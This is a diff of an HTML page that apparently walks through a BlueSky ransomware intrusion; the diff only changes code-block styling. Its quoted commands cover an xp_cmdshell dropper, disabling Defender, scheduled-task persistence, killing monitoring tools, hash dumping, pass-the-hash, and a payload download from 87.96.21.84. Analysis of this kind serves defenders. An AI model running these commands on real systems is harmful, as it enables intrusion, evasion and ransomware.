@@ -993,11 +993,11 @@ to <code>C:\ProgramData\</code>.</p>
 </h3>
 <p>The attacker at <code>87.96.21.84</code> performed a TCP port scan against the victim,
 discovering five open ports:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">445   SMB
-</span></span><span class="line"><span class="ln">2</span><span class="cl">139   NetBIOS
-</span></span><span class="line"><span class="ln">3</span><span class="cl">135   Microsoft RPC
-</span></span><span class="line"><span class="ln">4</span><span class="cl">5357  WS-Discovery
-</span></span><span class="line"><span class="ln">5</span><span class="cl">1433  Microsoft SQL Server</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>445   SMB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>139   NetBIOS
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>135   Microsoft RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>5357  WS-Discovery
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>1433  Microsoft SQL Server</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1023,8 +1023,8 @@ discovering five open ports:</p>
 </h3>
 <p>The attacker enumerated the MSSQL instance and authenticated using the
 system administrator account:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Username: sa
-</span></span><span class="line"><span class="ln">2</span><span class="cl">Password: cyb3rd3f3nd3r$</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Username: sa
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Password: cyb3rd3f3nd3r$</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1084,9 +1084,9 @@ the SQL connection and saved to <code>%TEMP%\SBjzH.b64</code>:</p>
 <p>A VBScript decoder (<code>Gjmwb.vbs</code>) was then constructed via <code>xp_cmdshell</code>
 to read the base64 file, decode it, write the result to <code>%TEMP%\LkUYP.exe</code>,
 and execute it silently — establishing a reverse shell:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">EXEC</span> <span class="n">master</span><span class="p">..</span><span class="py">xp_cmdshell</span> <span class="s1">&#39;echo Set ofs = CreateObject(&#34;Scripting.FileSystemObject&#34;)
-</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s1">  .OpenTextFile(&#34;%TEMP%\LkUYP.exe&#34;, 2, True) &gt;&gt;%TEMP%\Gjmwb.vbs
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="s1">&amp; echo shell.run &#34;%TEMP%\LkUYP.exe&#34;, 0, false &gt;&gt;%TEMP%\Gjmwb.vbs ...&#39;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>EXEC master..xp_cmdshell <span style="color:#e6db74">&#39;echo Set ofs = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#e6db74">  .OpenTextFile(&#34;%TEMP%\LkUYP.exe&#34;, 2, True) &gt;&gt;%TEMP%\Gjmwb.vbs
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#e6db74">&amp; echo shell.run &#34;%TEMP%\LkUYP.exe&#34;, 0, false &gt;&gt;%TEMP%\Gjmwb.vbs ...&#39;</span></span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1136,12 +1136,12 @@ and execute it silently — establishing a reverse shell:</p>
 </h3>
 <p>After the reverse shell was established, the attacker downloaded a toolkit
 from <code>http://87.96.21.84</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">checking.ps1       — AV disabling + persistence
-</span></span><span class="line"><span class="ln">2</span><span class="cl">del.ps1            — kill monitoring tools + WMI cleanup
-</span></span><span class="line"><span class="ln">3</span><span class="cl">ichigo-lite.ps1    — hash dumping + lateral movement + ransomware staging
-</span></span><span class="line"><span class="ln">4</span><span class="cl">Invoke-PowerDump.ps1
-</span></span><span class="line"><span class="ln">5</span><span class="cl">Invoke-SMBExec.ps1
-</span></span><span class="line"><span class="ln">6</span><span class="cl">javaw.exe          — BlueSky ransomware payload</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>checking.ps1       — AV disabling + persistence
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>del.ps1            — kill monitoring tools + WMI cleanup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>ichigo-lite.ps1    — hash dumping + lateral movement + ransomware staging
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>Invoke-PowerDump.ps1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>Invoke-SMBExec.ps1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>javaw.exe          — BlueSky ransomware payload</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1172,15 +1172,15 @@ Sophos services, set exclusion paths for <code>C:\ProgramData\Oracle</code> and
 <code>C:\Windows</code>, and modified Defender registry keys to prevent re-enabling.
 It then created a scheduled task <code>\Microsoft\Windows\MUI\LPupdate</code> running
 <code>del.ps1</code> every four hours as SYSTEM, and invoked <code>ichigo-lite.ps1</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="vm">$true</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Set-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="s2">&#34;C:\ProgramData\Oracle&#34;</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">Get-Service</span> <span class="n">WinDefend</span> <span class="p">|</span> <span class="nb">Stop-Service</span> <span class="n">-Force</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">schtasks</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">f</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;\Microsoft\Windows\MUI\LPupdate&#34;</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1&#34;</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="p">/</span><span class="n">ru</span> <span class="n">SYSTEM</span> <span class="p">/</span><span class="nb">sc </span><span class="n">HOURLY</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">4</span> <span class="p">/</span><span class="n">create</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Set-MpPreference -DisableRealtimeMonitoring $true
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Set-MpPreference -ExclusionPath <span style="color:#e6db74">&#34;C:\ProgramData\Oracle&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Get-Service WinDefend | Stop-Service -Force
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>C:\Windows\System32\schtasks.exe /f /tn <span style="color:#e6db74">&#34;\Microsoft\Windows\MUI\LPupdate&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>  /tr <span style="color:#e6db74">&#34;powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>  /ru SYSTEM /sc HOURLY /mo <span style="color:#ae81ff">4</span> /create</span></span></code></pre></div></div>
 <p>Without elevation, a lower-privilege scheduled task was created under a
 fake SID-named task name to blend with system tasks:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;Optimize Start Menu Cache Files-S-3-5-21-...&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">HOURLY</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">3</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>schtasks /create /tn <span style="color:#e6db74">&#34;Optimize Start Menu Cache Files-S-3-5-21-...&#34;</span> /sc HOURLY /mo <span style="color:#ae81ff">3</span></span></span></code></pre></div></div>
 
 <h4 class="relative group"><span style="color:red">del.ps1</span>
     <div id="delps1" class="anchor"></div>
@@ -1193,12 +1193,12 @@ fake SID-named task name to blend with system tasks:</p>
 </h4>
 <p>Removed WMI event subscriptions used for persistence detection, then killed
 monitoring and analysis tools to blind the defender:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Get-WmiObject</span> <span class="n">_FilterToConsumerBinding</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">subscription</span> <span class="p">|</span> <span class="nb">Remove-WmiObject</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nv">$list</span> <span class="p">=</span> <span class="s2">&#34;taskmgr&#34;</span><span class="p">,</span><span class="s2">&#34;perfmon&#34;</span><span class="p">,</span><span class="s2">&#34;SystemExplorer&#34;</span><span class="p">,</span><span class="s2">&#34;taskman&#34;</span><span class="p">,</span><span class="s2">&#34;ProcessHacker&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="s2">&#34;procexp64&#34;</span><span class="p">,</span><span class="s2">&#34;procexp&#34;</span><span class="p">,</span><span class="s2">&#34;Procmon&#34;</span><span class="p">,</span><span class="s2">&#34;Daphne&#34;</span>
-</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$task</span> <span class="k">in</span> <span class="nv">$list</span><span class="p">)</span> <span class="p">{</span> <span class="nb">stop-process</span> <span class="n">-name</span> <span class="nv">$task</span> <span class="n">-Force</span> <span class="p">}</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nb">stop-process</span> <span class="nv">$pid</span> <span class="n">-Force</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Get-WmiObject _FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>$list = <span style="color:#e6db74">&#34;taskmgr&#34;</span>,<span style="color:#e6db74">&#34;perfmon&#34;</span>,<span style="color:#e6db74">&#34;SystemExplorer&#34;</span>,<span style="color:#e6db74">&#34;taskman&#34;</span>,<span style="color:#e6db74">&#34;ProcessHacker&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>        <span style="color:#e6db74">&#34;procexp64&#34;</span>,<span style="color:#e6db74">&#34;procexp&#34;</span>,<span style="color:#e6db74">&#34;Procmon&#34;</span>,<span style="color:#e6db74">&#34;Daphne&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#66d9ef">foreach</span>($task <span style="color:#66d9ef">in</span> $list) { stop-process -name $task -Force }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>stop-process $pid -Force</span></span></code></pre></div></div>
 
 <h4 class="relative group"><span style="color:red">ichigo-lite.ps1</span>
     <div id="ichigo-liteps1" class="anchor"></div>
@@ -1211,17 +1211,17 @@ monitoring and analysis tools to blind the defender:</p>
 </h4>
 <p>Loaded <code>Invoke-PowerDump</code> and <code>Invoke-SMBExec</code> from the C2, then dumped
 NTLM hashes to <code>C:\ProgramData\hashes.txt</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-PowerDump</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">-FilePath</span> <span class="s2">&#34;C:\ProgramData\hashes.txt&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>Invoke-PowerDump | Out-File -FilePath <span style="color:#e6db74">&#34;C:\ProgramData\hashes.txt&#34;</span></span></span></code></pre></div></div>
 <p>Parsed the hash file for usernames and NTLM hashes, fetched a target host
 list from <code>http://87.96.21.84/extracted_hosts.txt</code>, and performed
 pass-the-hash lateral movement against each host via SMB:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$targetHost</span> <span class="k">in</span> <span class="nv">$hostsContent</span> <span class="n">-split</span> <span class="s2">&#34;</span><span class="se">`n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="nv">$targetHost</span> <span class="n">-Username</span> <span class="nv">$username</span> <span class="n">-Hash</span> <span class="nv">$password</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">foreach</span> ($targetHost <span style="color:#66d9ef">in</span> $hostsContent -split <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    Invoke-SMBExec -Target $targetHost -Username $username -Hash $password
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>}</span></span></code></pre></div></div>
 <p>Finally staged the ransomware payload:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">$blueUri</span> <span class="p">=</span> <span class="s2">&#34;http://87.96.21.84/javaw.exe&#34;</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$downloadDestination</span> <span class="p">=</span> <span class="s2">&#34;C:\ProgramData\javaw.exe&#34;</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nv">$downloadSuccess</span> <span class="p">=</span> <span class="nb">Download-FileFromURL</span> <span class="n">-url</span> <span class="nv">$blueUri</span> <span class="n">-destinationPath</span> <span class="nv">$downloadDestination</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$blueUri = <span style="color:#e6db74">&#34;http://87.96.21.84/javaw.exe&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>$downloadDestination = <span style="color:#e6db74">&#34;C:\ProgramData\javaw.exe&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>$downloadSuccess = Download-FileFromURL -url $blueUri -destinationPath $downloadDestination</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
